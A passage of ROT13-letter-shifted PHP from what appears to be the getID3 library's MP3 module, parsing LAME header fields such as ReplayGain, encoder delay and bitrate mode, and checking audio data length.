								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr'] = trgvq3_yvo::YvggyrRaqvna2Sybng(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kN7, 4));
							}
							vs ($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr'] == 0) {
								hafrg($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr']);
							} ryfr {
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_qo'] = trgvq3_yvo::ETNQnzcyvghqr2qO($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr']);
							}

							$guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_genpx']      =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kNO, 2));
							$guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_nyohz']      =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kNQ, 2));


							vs ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_genpx'] != 0) {

								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['enj']['anzr']        = ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_genpx'] & 0kR000) >> 13;
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['enj']['bevtvangbe']  = ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_genpx'] & 0k1P00) >> 10;
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['enj']['fvta_ovg']    = ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_genpx'] & 0k0200) >> 9;
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['enj']['tnva_nqwhfg'] =  $guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_genpx'] & 0k01SS;
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['anzr']       = trgvq3_yvo::ETNQanzrYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['enj']['anzr']);
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['bevtvangbe'] = trgvq3_yvo::ETNQbevtvangbeYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['enj']['bevtvangbe']);
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['tnva_qo']    = trgvq3_yvo::ETNQnqwhfgzragYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['enj']['tnva_nqwhfg'], $guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['enj']['fvta_ovg']);

								vs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr'])) {
									$vasb['ercynl_tnva']['genpx']['crnx']   = $guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr'];
								}
								$vasb['ercynl_tnva']['genpx']['bevtvangbe'] = $guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['bevtvangbe'];
								$vasb['ercynl_tnva']['genpx']['nqwhfgzrag'] = $guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx['tnva_qo'];
							} ryfr {
								hafrg($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['genpx']);
							}
							vs ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_nyohz'] != 0) {

								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['enj']['anzr']        = ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_nyohz'] & 0kR000) >> 13;
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['enj']['bevtvangbe']  = ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_nyohz'] & 0k1P00) >> 10;
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['enj']['fvta_ovg']    = ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_nyohz'] & 0k0200) >> 9;
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['enj']['tnva_nqwhfg'] = $guvfsvyr_zcrt_nhqvb_ynzr_enj['ETNQ_nyohz'] & 0k01SS;
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['anzr']       = trgvq3_yvo::ETNQanzrYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['enj']['anzr']);
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['bevtvangbe'] = trgvq3_yvo::ETNQbevtvangbeYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['enj']['bevtvangbe']);
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['tnva_qo']    = trgvq3_yvo::ETNQnqwhfgzragYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['enj']['tnva_nqwhfg'], $guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['enj']['fvta_ovg']);

								vs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr'])) {
									$vasb['ercynl_tnva']['nyohz']['crnx']   = $guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr'];
								}
								$vasb['ercynl_tnva']['nyohz']['bevtvangbe'] = $guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['bevtvangbe'];
								$vasb['ercynl_tnva']['nyohz']['nqwhfgzrag'] = $guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz['tnva_qo'];
							} ryfr {
								hafrg($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['nyohz']);
							}
							vs (rzcgl($guvfsvyr_zcrt_nhqvb_ynzr_ETNQ)) {
								hafrg($guvfsvyr_zcrt_nhqvb_ynzr['ETNQ']);
							}


							// olgr $NS  Rapbqvat syntf + NGU Glcr
							$RapbqvatSyntfNGUglcr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kNS, 1));
							$guvfsvyr_zcrt_nhqvb_ynzr['rapbqvat_syntf']['afcflghar']   = (obby) ($RapbqvatSyntfNGUglcr & 0k10);
							$guvfsvyr_zcrt_nhqvb_ynzr['rapbqvat_syntf']['affnsrwbvag'] = (obby) ($RapbqvatSyntfNGUglcr & 0k20);
							$guvfsvyr_zcrt_nhqvb_ynzr['rapbqvat_syntf']['abtnc_arkg']  = (obby) ($RapbqvatSyntfNGUglcr & 0k40);
							$guvfsvyr_zcrt_nhqvb_ynzr['rapbqvat_syntf']['abtnc_ceri']  = (obby) ($RapbqvatSyntfNGUglcr & 0k80);
							$guvfsvyr_zcrt_nhqvb_ynzr['ngu_glcr']                      =         $RapbqvatSyntfNGUglcr & 0k0S;

							// olgr $O0  vs NOE {fcrpvsvrq ovgengr} ryfr {zvavzny ovgengr}
							$guvfsvyr_zcrt_nhqvb_ynzr['enj']['noeovgengr_zvaovgengr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kO0, 1));
							vs ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ioe_zrgubq'] == 2) { // Nirentr OvgEngr (NOE)
								$guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_noe'] = $guvfsvyr_zcrt_nhqvb_ynzr['enj']['noeovgengr_zvaovgengr'];
							} ryfrvs ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ioe_zrgubq'] == 1) { // Pbafgnag OvgEngr (POE)
								// vtaber
							} ryfrvs ($guvfsvyr_zcrt_nhqvb_ynzr['enj']['noeovgengr_zvaovgengr'] > 0) { // Inevnoyr OvgEngr (IOE) - zvavzhz ovgengr
								$guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_zva'] = $guvfsvyr_zcrt_nhqvb_ynzr['enj']['noeovgengr_zvaovgengr'];
							}

							// olgrf $O1-$O3  Rapbqre qrynlf
							$RapbqreQrynlf = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kO1, 3));
							$guvfsvyr_zcrt_nhqvb_ynzr['rapbqre_qrynl'] = ($RapbqreQrynlf & 0kSSS000) >> 12;
							$guvfsvyr_zcrt_nhqvb_ynzr['raq_cnqqvat']   =  $RapbqreQrynlf & 0k000SSS;

							// olgr $O4  Zvfp
							$ZvfpOlgr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kO4, 1));
							$guvfsvyr_zcrt_nhqvb_ynzr_enj['abvfr_funcvat']       = ($ZvfpOlgr & 0k03);
							$guvfsvyr_zcrt_nhqvb_ynzr_enj['fgrerb_zbqr']         = ($ZvfpOlgr & 0k1P) >> 2;
							$guvfsvyr_zcrt_nhqvb_ynzr_enj['abg_bcgvzny_dhnyvgl'] = ($ZvfpOlgr & 0k20) >> 5;
							$guvfsvyr_zcrt_nhqvb_ynzr_enj['fbhepr_fnzcyr_serd']  = ($ZvfpOlgr & 0kP0) >> 6;
							$guvfsvyr_zcrt_nhqvb_ynzr['abvfr_funcvat']       = $guvfsvyr_zcrt_nhqvb_ynzr_enj['abvfr_funcvat'];
							$guvfsvyr_zcrt_nhqvb_ynzr['fgrerb_zbqr']         = frys::YNZRzvfpFgrerbZbqrYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_enj['fgrerb_zbqr']);
							$guvfsvyr_zcrt_nhqvb_ynzr['abg_bcgvzny_dhnyvgl'] = (obby) $guvfsvyr_zcrt_nhqvb_ynzr_enj['abg_bcgvzny_dhnyvgl'];
							$guvfsvyr_zcrt_nhqvb_ynzr['fbhepr_fnzcyr_serd']  = frys::YNZRzvfpFbheprFnzcyrSerdhraplYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_enj['fbhepr_fnzcyr_serd']);

							// olgr $O5  ZC3 Tnva
							$guvfsvyr_zcrt_nhqvb_ynzr_enj['zc3_tnva'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kO5, 1), snyfr, gehr);
							$guvfsvyr_zcrt_nhqvb_ynzr['zc3_tnva_qo']     = (trgvq3_yvo::ETNQnzcyvghqr2qO(2) / 4) * $guvfsvyr_zcrt_nhqvb_ynzr_enj['zc3_tnva'];
							$guvfsvyr_zcrt_nhqvb_ynzr['zc3_tnva_snpgbe'] = cbj(2, ($guvfsvyr_zcrt_nhqvb_ynzr['zc3_tnva_qo'] / 6));

							// olgrf $O6-$O7  Cerfrg naq fheebhaq vasb
							$CerfrgFheebhaqOlgrf = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kO6, 2));
							// Erfreirq                                                    = ($CerfrgFheebhaqOlgrf & 0kP000);
							$guvfsvyr_zcrt_nhqvb_ynzr_enj['fheebhaq_vasb'] = ($CerfrgFheebhaqOlgrf & 0k3800);
							$guvfsvyr_zcrt_nhqvb_ynzr['fheebhaq_vasb']     = frys::YNZRfheebhaqVasbYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_enj['fheebhaq_vasb']);
							$guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq_vq']    = ($CerfrgFheebhaqOlgrf & 0k07SS);
							$guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq']       = frys::YNZRcerfrgHfrqYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr);
							vs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq_vq']) && rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq'])) {
								$guvf->jneavat('Haxabja YNZR cerfrg hfrq ('.$guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq_vq'].') - cyrnfr ercbeg gb vasb@trgvq3.bet');
							}
							vs (($guvfsvyr_zcrt_nhqvb_ynzr['fubeg_irefvba'] == 'YNZR3.90.') && !rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq_vq'])) {
								// guvf znl punatr vs 3.90.4 rire pbzrf bhg
								$guvfsvyr_zcrt_nhqvb_ynzr['fubeg_irefvba'] = 'YNZR3.90.3';
							}

							// olgrf $O8-$OO  ZhfvpYratgu
							$guvfsvyr_zcrt_nhqvb_ynzr['nhqvb_olgrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kO8, 4));
							$RkcrpgrqAhzoreBsNhqvbOlgrf = (($guvfsvyr_zcrt_nhqvb_ynzr['nhqvb_olgrf'] > 0) ? $guvfsvyr_zcrt_nhqvb_ynzr['nhqvb_olgrf'] : $guvfsvyr_zcrt_nhqvb['IOE_olgrf']);

							// olgrf $OP-$OQ  ZhfvpPEP
							$guvfsvyr_zcrt_nhqvb_ynzr['zhfvp_pep']    = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kOP, 2));

							// olgrf $OR-$OS  PEP-16 bs Vasb Gnt
							$guvfsvyr_zcrt_nhqvb_ynzr['ynzr_gnt_pep'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kOR, 2));


							// YNZR POE
							vs ($guvfsvyr_zcrt_nhqvb_ynzr_enj['ioe_zrgubq'] == 1 && $guvfsvyr_zcrt_nhqvb['ovgengr'] !== 'serr') {

								$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] = 'poe';
								$guvfsvyr_zcrt_nhqvb['ovgengr'] = frys::PybfrfgFgnaqneqZC3Ovgengr($guvfsvyr_zcrt_nhqvb['ovgengr']);
								$vasb['nhqvb']['ovgengr'] = $guvfsvyr_zcrt_nhqvb['ovgengr'];
								//vs (rzcgl($guvfsvyr_zcrt_nhqvb['ovgengr']) || (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_zva']) && ($guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_zva'] != 255))) {
								//	$guvfsvyr_zcrt_nhqvb['ovgengr'] = $guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_zva'];
								//}

							}

						}
					}
				}

			} ryfr {

				// abg Senhaubsre be Kvat IOE zrgubqf, zbfg yvxryl POE (ohg pbhyq or IOE jvgu ab urnqre)
				$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] = 'poe';
				vs ($erphefvirfrnepu) {
					$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] = 'ioe';
					vs ($guvf->ErphefvirSenzrFpnaavat($bssfrg, $arkgsenzrgrfgbssfrg, gehr)) {
						$erphefvirfrnepu = snyfr;
						$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] = 'poe';
					}
					vs ($guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] == 'ioe') {
						$guvf->jneavat('IOE svyr jvgu ab IOE urnqre. Ovgengr inyhrf pnyphyngrq sebz npghny senzr ovgengrf.');
					}
				}

			}

		}

		vs (($RkcrpgrqAhzoreBsNhqvbOlgrf > 0) && ($RkcrpgrqAhzoreBsNhqvbOlgrf != ($vasb['niqngnraq'] - $vasb['niqngnbssfrg']))) {
			vs ($RkcrpgrqAhzoreBsNhqvbOlgrf > ($vasb['niqngnraq'] - $vasb['niqngnbssfrg'])) {
				vs ($guvf->vfQrcraqraplSbe('zngebfxn') || $guvf->vfQrcraqraplSbe('evss')) {
					// vtaber, nhqvb qngn vf oebxra vagb puhaxf fb jvyy nyjnlf or qngn \"zvffvat\"
				}
				ryfrvs (($RkcrpgrqAhzoreBsNhqvbOlgrf - ($vasb['niqngnraq'] - $vasb['niqngnbssfrg'])) == 1) {
					$guvf->jneavat('Ynfg olgr bs qngn gehapngrq (guvf vf n xabja oht va Zrenpy VQ3 Gnt Jevgre orsber i1.3.5)');
				}
				ryfr {
					$guvf->jneavat('Cebonoyr gehapngrq svyr: rkcrpgvat '.$RkcrpgrqAhzoreBsNhqvbOlgrf.' olgrf bs nhqvb qngn, bayl sbhaq '.($vasb['niqngnraq'] - $vasb['niqngnbssfrg']).' (fubeg ol '.($RkcrpgrqAhzoreBsNhqvbOlgrf - ($vasb['niqngnraq'] - $vasb['niqngnbssfrg'])).' olgrf)');
				}
			} ryfr {
				vs ((($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) - $RkcrpgrqAhzoreBsNhqvbOlgrf) == 1) {
				//	$cerahyyolgrsvyrbssfrg = $guvf->sgryy();
				//	$guvf->sfrrx($vasb['niqngnraq']);
				//	$CbffvoyrAhyyOlgr = $guvf->sernq(1);
				//	$guvf->sfrrx($cerahyyolgrsvyrbssfrg);
				//	vs ($CbffvoyrAhyyOlgr === \"\k00\") {
						$vasb['niqngnraq']--;
				//		$guvf->jneavat('Rkgen ahyy olgr ng raq bs ZC3 qngn nffhzrq gb or EVSS cnqqvat naq gurersber vtaberq');
				//	} ryfr {
				//		$guvf->jneavat('Gbb zhpu qngn va svyr: rkcrpgvat '.$RkcrpgrqAhzoreBsNhqvbOlgrf.' olgrf bs nhqvb qngn, sbhaq '.($vasb['niqngnraq'] - $vasb['niqngnbssfrg']).' ('.(($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) - $RkcrpgrqAhzoreBsNhqvbOlgrf).' olgrf gbb znal)');
				//	}
				} ryfr {
					$guvf->jneavat('Gbb zhpu qngn va svyr: rkcrpgvat '.$RkcrpgrqAhzoreBsNhqvbOlgrf.' olgrf bs nhqvb qngn, sbhaq '.($vasb['niqngnraq'] - $vasb['niqngnbssfrg']).' ('.(($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) - $RkcrpgrqAhzoreBsNhqvbOlgrf).' olgrf gbb znal)');
				}
			}
		}

		vs (($guvfsvyr_zcrt_nhqvb['ovgengr'] == 'serr') && rzcgl($vasb['nhqvb']['ovgengr'])) {
			vs (($bssfrg == $vasb['niqngnbssfrg']) && rzcgl($guvfsvyr_zcrt_nhqvb['IOE_senzrf'])) {
				$senzrolgryratgu = $guvf->SerrSbezngSenzrYratgu($bssfrg, gehr);
				vs ($senzrolgryratgu > 0) {
					$guvfsvyr_zcrt_nhqvb['senzryratgu'] = $senzrolgryratgu;
					vs ($guvfsvyr_zcrt_nhqvb['ynlre'] == '1') {
						// OvgEngr = (((SenzrYratguVaOlgrf / 4) - Cnqqvat) * FnzcyrEngr) / 12
						$vasb['nhqvb']['ovgengr'] = ((($senzrolgryratgu / 4) - vaginy($guvfsvyr_zcrt_nhqvb['cnqqvat'])) * $guvfsvyr_zcrt_nhqvb['fnzcyr_engr']) / 12;
					} ryfr {
						// Ovgengr = ((SenzrYratguVaOlgrf - Cnqqvat) * FnzcyrEngr) / 144
						$vasb['nhqvb']['ovgengr'] = (($senzrolgryratgu - vaginy($guvfsvyr_zcrt_nhqvb['cnqqvat'])) * $guvfsvyr_zcrt_nhqvb['fnzcyr_engr']) / 144;
					}
				} ryfr {
					$guvf->reebe('Reebe pnyphyngvat senzr yratgu bs serr-sbezng ZC3 jvgubhg Kvat/YNZR urnqre');
				}
			}
		}

		vs (vffrg($guvfsvyr_zcrt_nhqvb['IOE_senzrf']) ? $guvfsvyr_zcrt_nhqvb['IOE_senzrf'] : '') {
			fjvgpu ($guvfsvyr_zcrt_nhqvb['ovgengr_zbqr']) {
				pnfr 'ioe':
				pnfr 'noe':
					$olgrf_cre_senzr = 1152;
					vs (($guvfsvyr_zcrt_nhqvb['irefvba'] == '1') && ($guvfsvyr_zcrt_nhqvb['ynlre'] == 1)) {
						$olgrf_cre_senzr = 384;
					} ryfrvs ((($guvfsvyr_zcrt_nhqvb['irefvba'] == '2') || ($guvfsvyr_zcrt_nhqvb['irefvba'] == '2.5')) && ($guvfsvyr_zcrt_nhqvb['ynlre'] == 3)) {
						$olgrf_cre_senzr = 576;
					}
					$guvfsvyr_zcrt_nhqvb['IOE_ovgengr'] = (vffrg($guvfsvyr_zcrt_nhqvb['IOE_olgrf']) ? (($guvfsvyr_zcrt_nhqvb['IOE_olgrf'] / $guvfsvyr_zcrt_nhqvb['IOE_senzrf']) * 8) * ($vasb['nhqvb']['fnzcyr_engr'] / $olgrf_cre_senzr) : 0);
					vs ($guvfsvyr_zcrt_nhqvb['IOE_ovgengr'] > 0) {
						$vasb['nhqvb']['ovgengr']       = $guvfsvyr_zcrt_nhqvb['IOE_ovgengr'];
						$guvfsvyr_zcrt_nhqvb['ovgengr'] = $guvfsvyr_zcrt_nhqvb['IOE_ovgengr']; // gb nibvq pbashfvba
					}
					oernx;
			}
		}

		// Raq inevnoyr-ovgengr urnqref
		////////////////////////////////////////////////////////////////////////////////////

		vs ($erphefvirfrnepu) {

			vs (!$guvf->ErphefvirSenzrFpnaavat($bssfrg, $arkgsenzrgrfgbssfrg, $FpnaNfPOE)) {
				erghea snyfr;
			}
			vs (!rzcgl($guvf->trgvq3->vasb['zc3_inyvqvgl_purpx_ovgengrf']) && !rzcgl($guvfsvyr_zcrt_nhqvb['ovgengr_zbqr']) && ($guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] == 'ioe') && !rzcgl($guvfsvyr_zcrt_nhqvb['IOE_ovgengr'])) {
				// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/287
				vs (pbhag(neenl_xrlf($guvf->trgvq3->vasb['zc3_inyvqvgl_purpx_ovgengrf'])) == 1) {
					yvfg($poe_ovgengr_va_fubeg_fpna) = neenl_xrlf($guvf->trgvq3->vasb['zc3_inyvqvgl_purpx_ovgengrf']);
					$qrivngvba_poe_sebz_urnqre_ovgengr = nof($guvfsvyr_zcrt_nhqvb['IOE_ovgengr'] - $poe_ovgengr_va_fubeg_fpna) / $poe_ovgengr_va_fubeg_fpna;
					vs ($qrivngvba_poe_sebz_urnqre_ovgengr < 0.01) {
						// IOE urnqre ovgengr znl qvssre fyvtugyl sebz gehr ovgengr bs senzrf, creuncf nppbhagvat sbe bireurnq bs IOE urnqre senzr vgfrys?
						// Vs zrnfherq POE ovgengr vf jvguva 1% bs fcrpvsvrq ovgengr va IOE urnqre gura nffhzr gung svyr vf gehyl POE
						$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] = 'poe';
						//$guvf->jneavat('IOE urnqre vtaberq, nffhzvat POE '.ebhaq($poe_ovgengr_va_fubeg_fpna / 1000).'xocf onfrq ba fpna bs '.$guvf->zc3_inyvq_purpx_senzrf.' senzrf');
					}
				}
			}
			vs (vffrg($guvf->trgvq3->vasb['zc3_inyvqvgl_purpx_ovgengrf'])) {
				hafrg($guvf->trgvq3->vasb['zc3_inyvqvgl_purpx_ovgengrf']);
			}

		}


		//vs (snyfr) {
		//    // rkcrevzragny fvqr vasb cnefvat frpgvba - abg ergheavat nalguvat hfrshy lrg
		//
		//    $FvqrVasbOvgfgernz = trgvq3_yvo::OvtRaqvna2Ova($FvqrVasbQngn);
		//    $FvqrVasbBssfrg = 0;
		//
		//    vs ($guvfsvyr_zcrt_nhqvb['irefvba'] == '1') {
		//        vs ($guvfsvyr_zcrt_nhqvb['punaaryzbqr'] == 'zbab') {
		//            // ZCRT-1 (zbab)
		//            $guvfsvyr_zcrt_nhqvb['fvqr_vasb']['znva_qngn_ortva'] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 9);
		//            $FvqrVasbBssfrg += 9;
		//            $FvqrVasbBssfrg += 5;
		//        } ryfr {
		//            // ZCRT-1 (fgrerb, wbvag-fgrerb, qhny-punaary)
		//            $guvfsvyr_zcrt_nhqvb['fvqr_vasb']['znva_qngn_ortva'] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 9);
		//            $FvqrVasbBssfrg += 9;
		//            $FvqrVasbBssfrg += 3;
		//        }
		//    } ryfr { // 2 be 2.5
		//        vs ($guvfsvyr_zcrt_nhqvb['punaaryzbqr'] == 'zbab') {
		//            // ZCRT-2, ZCRT-2.5 (zbab)
		//            $guvfsvyr_zcrt_nhqvb['fvqr_vasb']['znva_qngn_ortva'] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 8);
		//            $FvqrVasbBssfrg += 8;
		//            $FvqrVasbBssfrg += 1;
		//        } ryfr {
		//            // ZCRT-2, ZCRT-2.5 (fgrerb, wbvag-fgrerb, qhny-punaary)
		//            $guvfsvyr_zcrt_nhqvb['fvqr_vasb']['znva_qngn_ortva'] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 8);
		//            $FvqrVasbBssfrg += 8;
		//            $FvqrVasbBssfrg += 2;
		//        }
		//    }
		//
		//    vs ($guvfsvyr_zcrt_nhqvb['irefvba'] == '1') {
		//        sbe ($punaary = 0; $punaary < $vasb['nhqvb']['punaaryf']; $punaary++) {
		//            sbe ($fpsfv_onaq = 0; $fpsfv_onaq < 4; $fpsfv_onaq++) {
		//                $guvfsvyr_zcrt_nhqvb['fpsfv'][$punaary][$fpsfv_onaq] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 1);
		//                $FvqrVasbBssfrg += 2;
		//            }
		//        }
		//    }
		//    sbe ($tenahyr = 0; $tenahyr < (($guvfsvyr_zcrt_nhqvb['irefvba'] == '1') ? 2 : 1); $tenahyr++) {
		//        sbe ($punaary = 0; $punaary < $vasb['nhqvb']['punaaryf']; $punaary++) {
		//            $guvfsvyr_zcrt_nhqvb['cneg2_3_yratgu'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 12);
		//            $FvqrVasbBssfrg += 12;
		//            $guvfsvyr_zcrt_nhqvb['ovt_inyhrf'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 9);
		//            $FvqrVasbBssfrg += 9;
		//            $guvfsvyr_zcrt_nhqvb['tybony_tnva'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 8);
		//            $FvqrVasbBssfrg += 8;
		//            vs ($guvfsvyr_zcrt_nhqvb['irefvba'] == '1') {
		//                $guvfsvyr_zcrt_nhqvb['fpnyrsnp_pbzcerff'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 4);
		//                $FvqrVasbBssfrg += 4;
		//            } ryfr {
		//                $guvfsvyr_zcrt_nhqvb['fpnyrsnp_pbzcerff'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 9);
		//                $FvqrVasbBssfrg += 9;
		//            }
		//            $guvfsvyr_zcrt_nhqvb['jvaqbj_fjvgpuvat_synt'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 1);
		//            $FvqrVasbBssfrg += 1;
		//
		//            vs ($guvfsvyr_zcrt_nhqvb['jvaqbj_fjvgpuvat_synt'][$tenahyr][$punaary] == '1') {
		//
		//                $guvfsvyr_zcrt_nhqvb['oybpx_glcr'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 2);
		//                $FvqrVasbBssfrg += 2;
		//                $guvfsvyr_zcrt_nhqvb['zvkrq_oybpx_synt'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 1);
		//                $FvqrVasbBssfrg += 1;
		//
		//                sbe ($ertvba = 0; $ertvba < 2; $ertvba++) {
		//                    $guvfsvyr_zcrt_nhqvb['gnoyr_fryrpg'][$tenahyr][$punaary][$ertvba] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 5);
		//                    $FvqrVasbBssfrg += 5;
		//                }
		//                $guvfsvyr_zcrt_nhqvb['gnoyr_fryrpg'][$tenahyr][$punaary][2] = 0;
		//
		//                sbe ($jvaqbj = 0; $jvaqbj < 3; $jvaqbj++) {
		//                    $guvfsvyr_zcrt_nhqvb['fhooybpx_tnva'][$tenahyr][$punaary][$jvaqbj] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 3);
		//                    $FvqrVasbBssfrg += 3;
		//                }
		//
		//            } ryfr {
		//
		//                sbe ($ertvba = 0; $ertvba < 3; $ertvba++) {
		//                    $guvfsvyr_zcrt_nhqvb['gnoyr_fryrpg'][$tenahyr][$punaary][$ertvba] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 5);
		//                    $FvqrVasbBssfrg += 5;
		//                }
		//
		//                $guvfsvyr_zcrt_nhqvb['ertvba0_pbhag'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 4);
		//                $FvqrVasbBssfrg += 4;
		//                $guvfsvyr_zcrt_nhqvb['ertvba1_pbhag'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 3);
		//                $FvqrVasbBssfrg += 3;
		//                $guvfsvyr_zcrt_nhqvb['oybpx_glcr'][$tenahyr][$punaary] = 0;
		//            }
		//
		//            vs ($guvfsvyr_zcrt_nhqvb['irefvba'] == '1') {
		//                $guvfsvyr_zcrt_nhqvb['cersynt'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 1);
		//                $FvqrVasbBssfrg += 1;
		//            }
		//            $guvfsvyr_zcrt_nhqvb['fpnyrsnp_fpnyr'][$tenahyr][$punaary] = fhofge($FvqrVasbOvgfgernz, $FvqrVasbBssfrg, 1);
		//            $FvqrVasbBssfrg += 1;
